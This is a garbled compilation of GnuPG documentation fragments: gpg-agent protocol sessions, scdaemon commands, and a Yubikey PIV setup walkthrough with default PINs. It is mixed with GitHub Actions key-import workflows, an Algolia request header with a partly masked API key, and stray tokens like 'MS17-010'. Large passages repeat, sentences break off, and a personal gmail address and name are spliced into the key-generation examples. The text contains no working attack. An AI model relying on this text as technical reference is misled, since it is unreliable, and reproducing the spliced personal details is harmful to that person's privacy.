If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit.

GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are:

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV Application PIN This is the string 123456.

PIN Unblocking Key This is the string 12345678. list (the string gpg/card> card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...] on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - uses: cli/gh-extension-precompile@v1 with: go_version: "1.16" Then

uses: cli/gh-extension-precompile@v1 env: CGO_ENABLED: 1
uses: cli/gh-extension-precompile@v1 with: build_script_override: "script/build.sh" name: release
on: push: tags: - "v*"

permissions: contents: write

jobs: release: runs-on: ubuntu-latest steps: - uses: actions/checkout@v3 - id: import_gpg uses: crazy-max/ghaction-import-gpg@v5 with: gpg_private_key: {{ secrets.GPG_PASSPHRASE }} - uses: cli/gh-extension-precompile@v1 with: gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}

macOS

gpg --armor --export-secret-key joe@foo.bar | pbcopy

Ubuntu (assuming GNU base64)

gpg --armor --export-secret-key joe@foo.bar -w0 | xclip

Arch

gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i

FreeBSD (assuming BSD base64)

gpg --armor --export-secret-key joe@foo.bar | xclip

name: import-gpg

on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} - name: List keys run: gpg -K name: import-gpg

on: push: branches: master

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" - name: List keys run: gpg -K

pub ed25519 2021-09-24 [C] 87F257B89CE462100BEC0FFE6071D218380FDCC8 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 uid [ unknown] Joe Bar joe@bar.foo sub ed25519 2021-09-24 [S] C17D11ADF199F12A30A0910F1F80449BE0B08CB8 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB name: import-gpg /.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add

application-priority piv to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens.

With one of these methods employed the list command of gpg-card shows this:

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB.key list --cards well. The PIV authentication key (internal reference PIV.9A Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption

gpg/card> auth 010203040506070801020304050607080102030405060708 gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected ‘--force’ gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpg self-signed X.509 certificate (exit the gpg-card tool, first):

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1 gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D keygrip gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt

MS17-010

000006

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: <6309304695z@gmail.co m> Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) ssh-add with the uppercase ‘-L $ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: keith bieszczat Email address: 6309304695z@gmail.com Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator You selected this USER-ID: "6309304695z@gmail.com"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid 6309304695z@gmail.com

run gpg in --expert mode $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save

/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

